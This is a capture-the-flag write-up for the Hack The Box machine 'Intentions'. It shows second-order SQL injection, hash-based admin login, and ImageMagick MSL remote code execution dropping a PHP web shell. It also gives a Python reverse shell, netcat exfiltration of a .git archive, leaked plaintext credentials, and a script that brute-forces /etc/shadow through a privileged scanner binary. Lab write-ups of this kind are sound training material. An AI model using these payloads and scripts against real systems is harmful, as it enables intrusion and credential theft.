## HTB Intentions (Hard) - Writeup

Difficulty: Hard

I found an admin API in admin.js and noticed bcrypt hashes were sent from the client, allowing me to reuse a hash to log in as admin.  
I exploited a vulnerable ImageMagick setup by sending an .msl file with the vid: scheme, achieving RCE and triggering a reverse shell.  
For privilege escalation, I found a .git folder, recovered it, and identified credentials from a past commit to SSH in as greg.  
To escalate to root, I abused a custom scanner binary with the cap_dac_read_search capability to read restricted files like /etc/shadow by bruteforcing contents based on MD5 hashes.   

---

## Nmap 

#### The nmap scan revealed two open ports:

![obraz](https://github.com/user-attachments/assets/1d6dec87-491a-4280-99a6-79199336240e)


## Port 80 - Website  

Website welcomes us with login/register page:  

![obraz](https://github.com/user-attachments/assets/53d471e0-30f7-467d-8411-c3fb843ab875)

We'll register an account:  

![obraz](https://github.com/user-attachments/assets/14bf2538-e552-42f6-a51f-f39f77fe8583)

We can change feed on this website which might be injectable, we'll leave it for now.  
Now let's run feroxbuster:  

![obraz](https://github.com/user-attachments/assets/938cba60-4fae-4b2b-b262-ce304aa79568)

It has found /admin.js, let's check it:  

![obraz](https://github.com/user-attachments/assets/3bafb16a-aaaf-4ac7-b9bc-ae0ac7568256)

At the bottom of the file we have found a message:  

![obraz](https://github.com/user-attachments/assets/ccd4d9bb-4b22-4b8d-9097-97320c00f98b)

```
Hey team, I’ve deployed the v2 API to production and have started using it in the admin section. Let me know if you spot any bugs.
This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text!
By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.
This should take care of the concerns raised by our users regarding our lack of HTTPS connection.
The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images.
I’ve included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some.
```

Api name can also be found here:  
+  /api/v2/admin/users




## SQL injection into feed

Let's come back to update feed option, it allows us to input comma separated categories like: nature,food, etc.  
It's worth to note that spaces get deleted when we update the favourite feed.  

In order to run sqlmap we need two requst.  
The first one is updating favourite categories:  
```
POST /api/v1/gallery/user/genres HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6IkhiTGtTQXlFNHJ6SkEvTGRacEpKYUE9PSIsInZhbHVlIjoia2oyWjZ2Y1hic1ZTQzY3d2luYVN0UnhHU3k4azVBejJhamNaaXpCR2ljelY1NVhoYWxrUDJqc3pibWhCYkJTU0E2QXBWN2VaTE1ndE55QnlVV0RUa0hRMGJrMEVIeGFhbG41TmcrcVcvM2E0SnZUbWpzdnhqUVRFSzVnL3ZuS00iLCJtYWMiOiIxMzQ0MTVkOTQ1ZTIwYjA5NGY2MDdjNjA5NmRjZWVhMjQ1Yjc0ZDFkMWY3MTUyZmFkNGEwOTRiMzAwYzlkZmYzIiwidGFnIjoiIn0=
Content-Length: 17
Origin: http://10.10.11.220
Connection: keep-alive
Referer: http://10.10.11.220/gallery
Cookie: XSRF-TOKEN=eyJpdiI6IkhiTGtTQXlFNHJ6SkEvTGRacEpKYUE9PSIsInZhbHVlIjoia2oyWjZ2Y1hic1ZTQzY3d2luYVN0UnhHU3k4azVBejJhamNaaXpCR2ljelY1NVhoYWxrUDJqc3pibWhCYkJTU0E2QXBWN2VaTE1ndE55QnlVV0RUa0hRMGJrMEVIeGFhbG41TmcrcVcvM2E0SnZUbWpzdnhqUVRFSzVnL3ZuS00iLCJtYWMiOiIxMzQ0MTVkOTQ1ZTIwYjA5NGY2MDdjNjA5NmRjZWVhMjQ1Yjc0ZDFkMWY3MTUyZmFkNGEwOTRiMzAwYzlkZmYzIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImlMbXVEb3lZek90MGFTaUY5bVFBb3c9PSIsInZhbHVlIjoicUxZRmlkS3FucHhjNTY3dVYvOVBiek1RZlZXSXZmVjJrQTRFUFR4OEtYU2VodGRPUG5hQzFDZ0lSaFgvb2FTMmZsYkRmVy96OC9ENFA0RmUzQjdFcVprdHhGOWFiaWZ3bGl6RVN2SVpTb1JGbWt4ZkJYL1drOGFobE1jMXN5cG4iLCJtYWMiOiJkMmRkM2I3MGYwNWQ0OGEwZDIxMDY1YjFjYjMzNWUxZTliZTM5ODdiODgyYTc4N2JlMTBmNTY2MzI3MGE0ZTk3IiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNzUwNTkwMDEwLCJleHAiOjE3NTA2MTE2MTAsIm5iZiI6MTc1MDU5MDAxMCwianRpIjoiUnpid0k1REFCMTM4czVnNyIsInN1YiI6IjI4IiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.9L-7_Ar3zgUMwPu8dz3lepl-WhBuMH9DoMGwW9BVAiM
Priority: u=0
{% raw %}
{"genres":"test"}
{% endraw %}
```

We'll save it to a file.  
The second request is looking at the feed:  
```
GET /api/v1/gallery/user/feed HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
X-XSRF-TOKEN: eyJpdiI6Ilc1Mkx2QUxCTWh3emdXc1plckcwUkE9PSIsInZhbHVlIjoieUJtNXp3ZGRrNHR6bnpmaEdNUWJaVHNyRG93SDZIQXFsMC9FYWg3WVdSZSt6NmJxcmhSRThWYjRTaHNQTExTZy9TU2R0UGM3UlI2YW9Lb2FPY2ZGbXlkTUQ0WGhVOFNVNXMvS1ZyRCtNZGtXbEpUSHlEQ05tU09NQUFta29MY3YiLCJtYWMiOiJjZWQ0N2FiMDBiNTZhZDAxYzhhYjZjMzY5NDFiZmYxZDUyOTY0YmE5NzYwM2JhYWE5YTdjMDM5NmQ5M2QwMGJiIiwidGFnIjoiIn0=
Connection: keep-alive
Referer: http://10.10.11.220/gallery
Cookie: XSRF-TOKEN=eyJpdiI6Ilc1Mkx2QUxCTWh3emdXc1plckcwUkE9PSIsInZhbHVlIjoieUJtNXp3ZGRrNHR6bnpmaEdNUWJaVHNyRG93SDZIQXFsMC9FYWg3WVdSZSt6NmJxcmhSRThWYjRTaHNQTExTZy9TU2R0UGM3UlI2YW9Lb2FPY2ZGbXlkTUQ0WGhVOFNVNXMvS1ZyRCtNZGtXbEpUSHlEQ05tU09NQUFta29MY3YiLCJtYWMiOiJjZWQ0N2FiMDBiNTZhZDAxYzhhYjZjMzY5NDFiZmYxZDUyOTY0YmE5NzYwM2JhYWE5YTdjMDM5NmQ5M2QwMGJiIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6InZ6dlFSNEtvUklPVjVnVFYvZGNBaWc9PSIsInZhbHVlIjoiUTNEWi9rYVh4cjhjTXpQN3c5NkdMT0JGcXdmdUNpU1FiUzQzTlRpYVNMMDhGSGNHUmlzT3hrYjU4SklHSFpFUEFpTjl2eVpoNzFiM0JTb241Q3BKNDA1N0xoczNRR0REcTRCSG0rRjV6elhvOWFWWUtFMlFFMFgyaXd3MkQxVzgiLCJtYWMiOiJjY2QwMzg0OTFmNDAzZjdmMjQ3ODM0NjAzNjA0OTU5ZGYyZTNjNjU5ZDhhNmQ4YWRkMjBlMTk4ODIxMTM5ZTJmIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNzUwNTkwMDEwLCJleHAiOjE3NTA2MTE2MTAsIm5iZiI6MTc1MDU5MDAxMCwianRpIjoiUnpid0k1REFCMTM4czVnNyIsInN1YiI6IjI4IiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.9L-7_Ar3zgUMwPu8dz3lepl-WhBuMH9DoMGwW9BVAiM
Priority: u=0
```

Now we can use those two to run sqlmap:  
```
sqlmap -r req.txt --second-req=secondreq.txt --batch --tamper=space2comment
```
tamper flag was used becasuse spaces get deleted.  
This flag just replaces spaces with block comments  /**/  

![obraz](https://github.com/user-attachments/assets/d16d655d-d58d-4299-943f-48adc5a42610)

It appeared to be injectable:  

![obraz](https://github.com/user-attachments/assets/c3d00234-68f9-4ce0-afd9-e73b76a40fe4)

Now we want to retrieve all of the tables,databases, etc.  
```
sqlmap -r req.txt --second-req=secondreq.txt --batch --tamper=space2comment --tables
```

Then dump users:  
```
sqlmap -r req.txt --second-req=secondreq.txt --batch --tamper=space2comment -T users --dump
```

![obraz](https://github.com/user-attachments/assets/a5203153-5f52-494d-b374-eca52529d794)

As a result we got two uncrackable hashes.  




## Abusing API  

We have to take a different apporach.  
Everything we do on the site is going through api v1, but we know that there is an api v2.  
We want to play with login request, we need to catch it with burpsuite, I'll paste it here:  
```
POST /api/v1/auth/login HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6IjhjMGpaWTB6dm9mdmMwUEU5YWJObnc9PSIsInZhbHVlIjoiYmxTZUZQeERKa0cvUGlRNXh3UUt2M28rcjhWUGl5SHBZaDNkS3ZYR0tDSURKNG1SYkNFWjlBMXN2TXZSRzdOYS9pOGRxblNzdkJhRll6VEhHMkpMY2RZd3ZQZC8xSW1rTzVsNDcxQnhQV3lVUGlOajloVXB3TFdIVkU3VnNDSFYiLCJtYWMiOiJkNGVmZjlhNTBiOWM1NTE1MWY2ZjcwYTgxMzkwNjc5ZDE1Y2QzY2Q1OGU3YmUwNzg1ZmFkMWM5MWU3NjMwNzBmIiwidGFnIjoiIn0=
Content-Length: 43
Origin: http://10.10.11.220
Connection: keep-alive
Referer: http://10.10.11.220/
Cookie: XSRF-TOKEN=eyJpdiI6IjhjMGpaWTB6dm9mdmMwUEU5YWJObnc9PSIsInZhbHVlIjoiYmxTZUZQeERKa0cvUGlRNXh3UUt2M28rcjhWUGl5SHBZaDNkS3ZYR0tDSURKNG1SYkNFWjlBMXN2TXZSRzdOYS9pOGRxblNzdkJhRll6VEhHMkpMY2RZd3ZQZC8xSW1rTzVsNDcxQnhQV3lVUGlOajloVXB3TFdIVkU3VnNDSFYiLCJtYWMiOiJkNGVmZjlhNTBiOWM1NTE1MWY2ZjcwYTgxMzkwNjc5ZDE1Y2QzY2Q1OGU3YmUwNzg1ZmFkMWM5MWU3NjMwNzBmIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImZHM2Z5Z2Qxd2Q4YWtReDFnbDQ0UXc9PSIsInZhbHVlIjoiTE02RUxXR3RSMENzZDYzMWZIV3NXWm11R1FYY3F4WVNiMnlMY29ueDJ6Zy9RNWprbVE5SWZhbUtHUUJiUUJOWjlGTHlmS29KRjhzUk45L0pMdWNWSzJYMTBjd0dkOFM1ZzBzY3F0Z24yaHBSSHVpb0ZPNG1rbUsxQkZDR0NUZnciLCJtYWMiOiIwZGFjZWRhYzNiY2I5MDQwMGZhMjIzYzgwZWRkNzM0ZmFhNjU3MWJkNjIzOGU1ZmZkYzdhMDljMGZlZmExNDA3IiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNzUwNTkwMDEwLCJleHAiOjE3NTA2MTE2MTAsIm5iZiI6MTc1MDU5MDAxMCwianRpIjoiUnpid0k1REFCMTM4czVnNyIsInN1YiI6IjI4IiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.9L-7_Ar3zgUMwPu8dz3lepl-WhBuMH9DoMGwW9BVAiM
Priority: u=0
{% raw %}
{
"email":"test@test.com",
"password":"test"
}
{% endraw %}
```

![obraz](https://github.com/user-attachments/assets/a5169dfa-35bb-469e-9381-b671b13f7b00)

If we change it to v2 instead of v1 we get a different response:  

![obraz](https://github.com/user-attachments/assets/d0eaef9f-256a-45b0-b649-52fe633341cb)

Replace the password field with a hash field, then add the hash we obtained earlier along with a valid email.   

![obraz](https://github.com/user-attachments/assets/d3df3faa-a979-4b9d-9206-39315f9f0af0)

Now it works, we get a success as response.  
Now just intercept the request again, change the password field to hash, update the email to Greg's, switch the form version from v1 to v2, and click 'Forward' in Burp.  




## Logged in as admin  

Now we can access /admin directory.  

![obraz](https://github.com/user-attachments/assets/4556cb90-c30c-4db7-a197-844a94995e14)

The news page gives us some additional information:  
```
The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images.
I've included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some: Image Feature Reference
```
The last item is a link, let's follow it.  
It's a link to image magick php.  

![obraz](https://github.com/user-attachments/assets/26721464-d19b-4f5d-902e-b41801c79bcf)

We can modify photos in images -> edit
Intercept this request with burp:  

![obraz](https://github.com/user-attachments/assets/bc83286a-d6e0-4899-9f53-0c71c2f9459d)

It contains two parameters - path and effect.   
Whemever we see something like path it's always a good idea to check for LFI.  

![obraz](https://github.com/user-attachments/assets/70ce1255-118b-4c8e-99ad-7dabb060cc32)

We get "bad image path".  
If we put our python server path we still get the same error.  


## Image Magick - Exploitation  

We'll follow one particular article for this exploitation:  
```
https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/
```

First method in this article involves bruteforcing filenames.  
We will use second one, you can scroll to:  
+  RCE #2: VID Scheme

We want to modify the request so it looks like this:  
```
POST /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=swirl HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=ABC
X-XSRF-TOKEN: eyJpdiI6Ikd2NjV1WVMveWtxbVVBOVl2cFF3V1E9PSIsInZhbHVlIjoiR3RRQUpiSEFOTE1RdVk2UkRMenBaR29lY0swZ3N2L2ZZZHBZM0FjWEQwWlFQbUZ6dk1NR0h4OVZDV3BIeUx0alBJL3ZnbHFLVS90Zi92aFl6OGtzY2l5ZFdGNXhsZTVvdGduRnFkbnRIQU9LdVE4MGl6TkNZWGwzQXZlRWZOdWwiLCJtYWMiOiI3ZTIxZTBiNmYxYjMzNzRhMGY2OTlkMWMyYzkwMDZlNmE5MzRmOWRmNmU2ZjlmNDM5MDU2ZjM2Mjg0OGYyNWYyIiwidGFnIjoiIn0=
Content-Length: 324
Origin: http://10.10.11.220
Connection: keep-alive
Referer: http://10.10.11.220/admin
Cookie: XSRF-TOKEN=eyJpdiI6Ikd2NjV1WVMveWtxbVVBOVl2cFF3V1E9PSIsInZhbHVlIjoiR3RRQUpiSEFOTE1RdVk2UkRMenBaR29lY0swZ3N2L2ZZZHBZM0FjWEQwWlFQbUZ6dk1NR0h4OVZDV3BIeUx0alBJL3ZnbHFLVS90Zi92aFl6OGtzY2l5ZFdGNXhsZTVvdGduRnFkbnRIQU9LdVE4MGl6TkNZWGwzQXZlRWZOdWwiLCJtYWMiOiI3ZTIxZTBiNmYxYjMzNzRhMGY2OTlkMWMyYzkwMDZlNmE5MzRmOWRmNmU2ZjlmNDM5MDU2ZjM2Mjg0OGYyNWYyIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6InVDWFBiaVEvc21oQ0FKUGVyazZTTXc9PSIsInZhbHVlIjoiaHBJTzNyQ0xGMWs3ckI1Mkw1ekp0dEFqUkV2ZnlqUE1TNlVDYUozVXhJanBjbmxkaDFrUDJGMWFEK29US0czTVFKTHpHbzU0WU1xdUJPd3k3d1B1VXQ4N2MrS3h6QWJFaVF4bW16eHFiem9mZTQzUDRTUnJLbCtlUEFPNnRIbVkiLCJtYWMiOiJjYjZmMzRmZjBiOTAyOGY1OTNmNDU2ZjlkODBlOWJiYzc2ZGZhOGQ4YTZhY2NjMmI0NjczMzIwNDJkNTgyNzc0IiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNzUwNTkzMTIwLCJleHAiOjE3NTA2MTQ3MjAsIm5iZiI6MTc1MDU5MzEyMCwianRpIjoiRnVRRjEyb3hRaUltWDltQSIsInN1YiI6IjIiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.8InXlN0bOpBn_OWU9DklOLznKEmlVuwkgPTG26D2BPI
Priority: u=0


--ABC
Content-Disposition: form-data; name="swarm"; filename="swarm.msl"
Content-Type: text/plain

<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;" />
 <write filename="info:/var/www/html/intentions/storage/app/public/file2.php" />
</image>
--ABC--
```

We moved parameters to the top of the request.  
We pass an .msl file to image magick.  
When ImageMagick is told to read an .msl file (via vid:msl:/path/file), it parses the file as a script, not an image.  
The original name is swarm.msl, but PHP doesn't keep that name.  
PHP saves it in /tmp/ as something like /tmp/phpABC123, a random temp file.  
The file is called file2.php in our case and now can be accessed at:  
+  http://10.10.11.220/storage/file2.php

![obraz](https://github.com/user-attachments/assets/8d76f22a-1a0f-4ed9-91ed-d8f39ee44122)


I tried a few shells, the one that worded was python rev shell:  
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",9005));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![obraz](https://github.com/user-attachments/assets/7808ee7f-6204-48a4-8e4d-8667763dcb7f)






## Priv Esc 1  

We have found .git directory in web directory:  

![obraz](https://github.com/user-attachments/assets/ee189e39-b6b7-466e-bd6a-ab05c3bde980)

We need to move this directory to kali, easiest way to do that is to archive whole directory.  
```
tar -cf /tmp/git.tar .git
```

Then we can move it with netcat:  
```
Kali:  
nc -nvlp 80 > git.tar

Target:  
nc -w 3 10.10.14.9 80 < git.tar
```
![obraz](https://github.com/user-attachments/assets/089171bd-8b07-4a76-9d68-f29234a564fd)

![obraz](https://github.com/user-attachments/assets/b08629b6-1efb-4ecb-9f8f-6d2e314198cf)

Last thing we need to do is to extract contents of this archive:   
```
tar -xf git.tar
```

![obraz](https://github.com/user-attachments/assets/1a5cdcb4-c9fb-4c14-ad5c-96ea59bc1218)

When enumerating .git directory it's always a good idea to check previous git commits as they might contain sensitive data.  
It can be done with:  
```
git log
```

![obraz](https://github.com/user-attachments/assets/b5773e65-41c0-46bd-a8fb-df7e047037e9)

We can compare the differeneces between various commits.  
The one that revealed senstive information was:  
```
git diff d7ef022d3bc4e6d02b127fd7dcc29c78047f31bd 36b4287cf2fb356d868e71dc1ac90fc8fa99d319
```

![obraz](https://github.com/user-attachments/assets/c787869a-1cdd-4f4b-91c1-9b786c73a976)

![obraz](https://github.com/user-attachments/assets/fb4438d8-069e-4a66-9c32-1007709e8dde)

We found credentials.  
+  gref:Gr3g1sTh3B3stDev3l0per!1998!

We can use to login with ssh and retrieve a flag:  

![obraz](https://github.com/user-attachments/assets/78490496-a733-45f4-8180-82662b6cc6c0)


## Priv Esc to root

There is a script in our home directory that we can execute:  

![obraz](https://github.com/user-attachments/assets/7a37de90-3074-45b3-8dc2-f01b596954a1)

We're also in "scanner" group.  
At this point I'll just run linpeas.  

![obraz](https://github.com/user-attachments/assets/1284649f-a24e-4947-9f02-65a2ec7d854f)

Linpeas has found an intresting capability:  

![obraz](https://github.com/user-attachments/assets/fdbc364b-0125-44ab-9f84-25243d118658)

/opt/scanner/scanner  has  cap_dac_read_search=ep
It means that the scanner binary can read any file.  

Let's take a look at this binary help:  
```
/opt/scanner/scanner 
The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.

        This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
        This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
        File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.

        The hash blacklist file should be maintained as a single LABEL:MD5 per line.
        Please avoid using extra colons in the label as that is not currently supported.

        Expected output:
        1. Empty if no matches found
        2. A line for every match, example:
                [+] {LABEL} matches {FILE}

  -c string
        Path to image file to check. Cannot be combined with -d
  -d string
        Path to image directory to check. Cannot be combined with -c
  -h string
        Path to colon separated hash file. Not compatible with -p
  -l int
        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p    [Debug] Print calculated file hash. Only compatible with -c
  -s string
        Specific hash to check against. Not compatible with -h
```
This binary lets us calculate and compare MD5 hashes of files, or just the first few characters of them using -l.  
While it's meant to compare a file against a list of hashes, it also prints the hash with -p, allowing us to brute force file content byte by byte.  

Basically it displays a hash of the first letter of a file, prints it.
Then our script will compare all of the hashes of all printable characters and compare them.  
Eventually it will allow us to fully bruteforce a file.  

```
import string
import hashlib
import subprocess
import os

read_file = input("Path to file (default /etc/shadow):")
if read_file == "":
        read_file = "/etc/shadow"
scanner_path = "/opt/scanner/scanner"
charset = string.printable
base = ""

def generate_hash_file(current_base):
    hash_map = {}
    with open("hash.log", "w") as f:
        for char in charset:
            test_str = current_base + char
            md5_hash = hashlib.md5(test_str.encode()).hexdigest()
            hash_map[md5_hash] = test_str
            f.write(f"{md5_hash}:{md5_hash}\n")
    return hash_map

def run_scanner(length_limit):
    try:
        result = subprocess.Popen(
            [scanner_path, "-c", read_file, "-h", "hash.log", "-l", str(length_limit)],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL
        )
        return result.stdout
    except Exception as e:
        print("[!] Failed to run scanner:", e)
        return []

def check_for_match(current_base, hash_map):
    output = run_scanner(len(current_base) + 1)
    for line in output:
        decoded = line.decode(errors="ignore").strip()
        if decoded.startswith("[+]"):
            parts = decoded.split()
            if len(parts) == 4 and parts[1] in hash_map:
                return hash_map[parts[1]]
    return None

def main():
    base = ""
    while True:
        hash_map = generate_hash_file(base)
        match = check_for_match(base, hash_map)
        if match:
            base = match
        else:
            break

    print(base)

if __name__ == "__main__":
    main()
```

With this script we can retrieve ssh key:  

![obraz](https://github.com/user-attachments/assets/f70d5d54-8853-4c9f-a85e-9fc818d306e6)

Login as root:  

![obraz](https://github.com/user-attachments/assets/1b35e99e-8a10-4321-aa69-f2457ddb3965)

And lastly retrieve a flag:  

![obraz](https://github.com/user-attachments/assets/2387d86c-4ce8-40f1-99ba-f0d700b6300d)

Thanks for reading!  
























































